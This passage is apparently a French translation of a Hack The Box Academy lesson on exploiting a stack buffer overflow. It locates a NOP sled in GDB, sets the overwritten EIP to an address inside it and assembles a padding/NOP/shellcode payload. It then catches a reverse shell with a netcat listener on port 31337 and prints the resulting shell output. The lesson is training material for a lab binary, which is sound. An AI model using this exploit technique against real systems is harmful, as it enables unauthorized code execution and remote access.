Identification de l'adresse de retour
====================================

* * * * *

Après avoir vérifié que nous contrôlons toujours l'EIP avec notre shellcode, nous avons maintenant besoin d'une adresse mémoire où se trouvent nos NOP pour dire à l'EIP d'y accéder. Cette adresse mémoire ne doit contenir aucun des mauvais caractères que nous avons trouvés précédemment.

#### GDB NOPS

GDB NOPS

```
(gdb) x/2000xb $esp+1400

<SNIP>
0xffffd5ec : 0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55
0xffffd5f4 : 0x55 0x55 0x55 0x55 0x55 0x55 0x90 0x90
# Fin de "\x55"s ---->| |---> NOPS
0xffffd5fc : 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd604 : 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd60c : 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd614 : 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd61c : 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd624 : 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd62c : 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd634 : 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd63c : 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd644 : 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd64c : 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd654 : 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd65c : 0x90 0x90 0xda 0xca 0xba 0xe4 0x11 0xd4
# |---> Shellcode
<SNIP>

```

Ici, nous devons maintenant choisir une adresse à laquelle nous référons le `EIP` et qui lit et exécute un octet après l'autre à partir de cette adresse. Dans cet exemple, nous prenons l'adresse `0xffffd64c`. Illustré, il ressemble alors à ceci :

#### Amortir

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_9.png)

Après avoir sélectionné une adresse mémoire, nous remplaçons notre "`\x66`" qui écrase l'EIP pour lui dire de passer à l'adresse `0xffffd64c` . Notez que l'entrée de l'adresse est entrée à l'envers.

#### Remarques

Remarques

```
    Tampon = "\x55" * (1040 - 100 - 95 - 4) = 841
      NOP = "\x90" * 100
Shellcode = "\xda\xca\xba\xe4\x11\xd4...<SNIP>...\x5a\x22\xa2"
       EIP = "\x4c\xd6\xff\xff"

```

Étant donné que notre shellcode crée un reverse shell, nous laissons `netcat` écouter sur le port 31337.

#### Netcat - Écouteur de shell inversé

Netcat - Écouteur de shell inversé

```
étudiant@nix-arc:$ nc -nlvp 31337

Écoute sur [0.0.0.0] (famille 0, port 31337)

```

Après avoir démarré notre écouteur `netcat`, nous exécutons à nouveau notre exploit adapté, qui déclenche ensuite la connexion du processeur à notre écouteur.

#### Exploitation

Exploitation

```
(gdb) exécutez $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\ x5a\x22\xa2" + "\x4c\xd6\xff\xff"')

```

#### Netcat - Écouteur de shell inversé

Netcat - Écouteur de shell inversé

```
Écoute sur [0.0.0.0] (famille 0, port 31337)
Connexion de 127.0.0.1 33504 reçue !

identifiant

uid=1000(étudiant) gid=1000(étudiant) groupes=1000(étudiant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126 (partage de samba)

```

Nous voyons maintenant que nous avons obtenu une connexion à partir de l'adresse IP locale. Cependant, il n'est pas évident que nous ayons une coquille. Nous tapons donc la commande "`id`" pour obtenir plus d'informations sur l'utilisateur. Si nous obtenons une valeur de retour avec des informations, nous savons que nous sommes dans un shell, comme indiqué dans l'exemple.